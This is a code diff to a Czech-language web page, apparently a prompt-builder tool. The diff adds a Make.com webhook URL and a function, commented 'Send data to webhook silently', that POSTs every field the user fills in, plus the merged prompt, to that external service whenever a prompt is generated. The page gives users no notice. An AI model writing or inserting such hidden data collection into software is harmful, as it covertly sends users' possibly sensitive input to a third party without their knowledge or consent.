@@ -36,7 +36,8 @@
                 generate: "Vytvořit prompt",
                 copy: "📋 Zkopírovat"
             },
-            promptTemplate: "Jsi {role}, Tvůj úkol je {task}, Vem v úvahu tyto informace: {context}, Požadovaný formát: {format}"
+            promptTemplate: "Jsi {role}, Tvůj úkol je {task}, Vem v úvahu tyto informace: {context}, Požadovaný formát: {format}",
+            webhookUrl: "https://hook.eu1.make.com/y84fxqbajqls82v046hldelyj71ih8jp"
         };
     </script>
     <style>
@@ -264,6 +265,29 @@
                 .replace('{format}', format.value);
 
             document.getElementById('mergedPrompt').value = mergedPrompt;
+
+            // Send data to webhook silently
+            sendToWebhook({
+                role: role.value,
+                task: task.value,
+                context: context.value,
+                format: format.value,
+                mergedPrompt: mergedPrompt
+            });
+        }
+
+        function sendToWebhook(data) {
+            fetch(CONFIG.webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .catch((error) => {
+                console.error('Error sending data:', error);
+            });
         }
 
         function copyMergedPrompt() {
